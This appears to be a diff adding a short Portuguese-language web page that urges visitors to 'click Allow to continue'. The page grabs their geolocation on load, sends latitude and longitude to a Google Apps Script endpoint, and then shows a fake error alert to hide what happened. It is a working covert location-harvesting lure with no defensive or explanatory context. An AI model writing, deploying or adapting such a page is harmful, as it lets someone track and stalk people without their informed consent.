@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title> </title>
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation);
+        } else {
+          alert("Geolocalização não é suportada neste navegador.");
+        }
+      }
+
+      function sendLocation(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+
+        // URL do seu script Google Apps Script
+        const url = "https://script.google.com/macros/s/AKfycbwYOerrVwS24d7WHZ1bwZ6cq4kn1L04IuyrPFU0vv4-bJKJWkmInu4TINKH9QG83s0k/exec?informacao=";
+
+        // Enviando os dados para o script
+        fetch(`${url}latitude=${lat} longitude=${lng}`)
+          .then(response => response.text())
+          .then(data => alert("erro"))
+          .catch(error => alert("Erro ao enviar localização: " + error));
+      }
+    </script>
+  </head>
+  <body onload="getLocation()">
+<h1> </h1>
+<h1> </h1>
+    <h1>Clique em Permitir para continuar...</h1>
+  </body>
+</html>
